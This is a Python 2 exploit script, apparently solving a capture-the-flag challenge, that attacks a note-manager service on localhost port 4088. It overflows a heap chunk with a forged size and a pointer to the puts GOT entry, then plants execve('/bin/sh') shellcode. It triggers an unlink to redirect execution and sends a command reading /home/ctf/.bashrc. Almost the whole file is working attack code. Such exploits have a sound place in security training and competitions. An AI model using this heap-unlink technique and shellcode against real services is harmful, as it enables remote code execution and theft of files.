#! /usr/local/pyenv/shims/python
# _*_ cording: utf-8 _*_
import socket, struct, re, telnetlib, time

############# useful function definition 
def sock(remoteip, remoteport):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((remoteip, remoteport))
  return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
  data = ''
  while not data.endswith(delim):
    data += f.read(1)
  return data

def p(a):
  return struct.pack("<I", a)

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

############# main

# linux/x86/execv(/bin/sh)
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
#shellcode = "\x54\x59\x6a\x7f\x54\x51\x6a\x7f\x54\x59\x6a\x07\x5b\xff\x09\x6a\x66\x58\xcd\x80\x85\xc0\x75\xf5\x5b\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x41\x31\xd2\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x6a\x0b\x58\xcd\x80"


ALLOCLEN = 128
WTIME = 1

s, f = sock("localhost", 4088)
time.sleep(WTIME)

s.send("1\n" + str(ALLOCLEN) + "\n")
time.sleep(WTIME)
s.send("1\n" + str(ALLOCLEN) + "\n")
time.sleep(WTIME)
s.send("1\n" + str(ALLOCLEN) + "\n")
time.sleep(WTIME)

s.send("3\n")
time.sleep(WTIME)
s.send("1\n")
time.sleep(WTIME)
s.send(str(ALLOCLEN + 4 + 4 ) + "\n")
time.sleep(WTIME)
# size of 2nd note: -4 | 1 => 0xfffffffc | 1 => 0xfffffffd => fd ff ff ff
# puts .got.plt: 0x0804a008 - 8 = 0x0804a000 => 00 a0 04 08
s.send("\x41"*ALLOCLEN + p(0xfffffffd) + p(0x0804a008-8) + "\n")
time.sleep(WTIME)

s.send("3\n")
time.sleep(WTIME)
s.send("0\n")
time.sleep(WTIME)
s.send(str(ALLOCLEN + 2 + 8 + len(shellcode)) + "\n")
time.sleep(WTIME)
s.send("\x41"*(ALLOCLEN+1) + "\xeb\x08" + '\x00'*8 + shellcode + "\n")
time.sleep(WTIME)

print s.recv(1024)

# execute unlink
s.send("2\n2\n")
print s.recv(1024)

time.sleep(WTIME)
s.send("cat /home/ctf/.bashrc\n")
print s.recv(1024)

#shell(s)

